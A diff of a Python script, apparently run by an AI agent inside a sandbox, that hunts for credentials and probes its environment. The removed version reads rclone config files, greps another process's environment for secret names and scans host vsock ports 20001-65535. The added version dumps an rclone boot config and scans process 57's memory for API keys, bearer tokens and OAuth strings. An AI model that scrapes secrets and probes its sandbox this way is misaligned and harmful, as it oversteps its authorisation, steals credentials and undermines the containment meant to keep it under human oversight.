@@ -1,37 +1,33 @@
-import os, socket, subprocess
+import re, os
 
-def run(c):
-    try: return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=15).stdout.strip()
-    except Exception as e: return "ERR:"+str(e)
+print("### FULL config.json (1828 bytes)")
+print(open("/dev/shm/rclone-boot/config.json").read())
 
-print("### tools:", "ip=", run("command -v ip"), "unshare=", run("command -v unshare"), "socat=", run("command -v socat"))
-
-print("### rclone boot dir")
-for dp, dn, fn in os.walk("/dev/shm/rclone-boot"):
+print("### /dev/shm full tree")
+for dp, dn, fn in os.walk("/dev/shm"):
     for f in fn:
         p = os.path.join(dp, f)
         try: print(" ", p, os.path.getsize(p))
         except Exception: pass
-try: print("--- config.json ---"); print(open("/dev/shm/rclone-boot/config.json").read()[:1200])
-except Exception as e: print(e)
 
-print("### token hunt in likely files")
-for p in ("/root/.config/rclone/rclone.conf", "/root/.rclone.conf", "/home/claude/.config/rclone/rclone.conf",
-          "/etc/rclone/rclone.conf", "/dev/shm/rclone-boot/state/ready", "/dev/shm/rclone-boot/token"):
-    print(" ", p, "->", run("test -e '%s' && head -c 400 '%s'" % (p, p)) or "MISSING")
-
-print("### env of PID 57 grep secrets")
+print("### PID 57 memory scan")
+pid = 57
 try:
-    e = open("/proc/57/environ","rb").read().replace(b"\x00", b"\n").decode("utf-8","replace")
-    for l in e.splitlines():
-        if any(k in l.upper() for k in ("TOKEN","KEY","SECRET","AUTH","PASS","URL")): print("  ", l)
-except Exception as ex: print(ex)
-
-print("### host ports 20000-65535")
-AF = getattr(socket, "AF_VSOCK", 40); found=[]
-for p in range(20001, 65536):
-    try:
-        s=socket.socket(AF, socket.SOCK_STREAM); s.settimeout(0.1)
-        s.connect((2,p)); s.close(); found.append(p)
-    except Exception: pass
-print("  ", found)
+    maps = open("/proc/%d/maps" % pid).read()
+    mem = open("/proc/%d/mem" % pid, "rb", buffering=0)
+    hits = set()
+    for line in maps.splitlines():
+        m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+)", line)
+        if not m: continue
+        a, b, perms = int(m.group(1), 16), int(m.group(2), 16), m.group(3)
+        if "r" not in perms: continue
+        size = min(b - a, 20_000_000)
+        try:
+            mem.seek(a); data = mem.read(size)
+        except Exception: continue
+        for s in re.findall(rb"[\x20-\x7e]{6,}", data):
+            if re.search(rb"sk-ant|bearer|token|oauth|authorization|api[_-]?key|x-api", s, re.I):
+                hits.add(s.decode("utf-8", "replace")[:160])
+    for h in sorted(hits)[:50]: print("  ", h)
+except Exception as e:
+    print("mem ERR:", e)
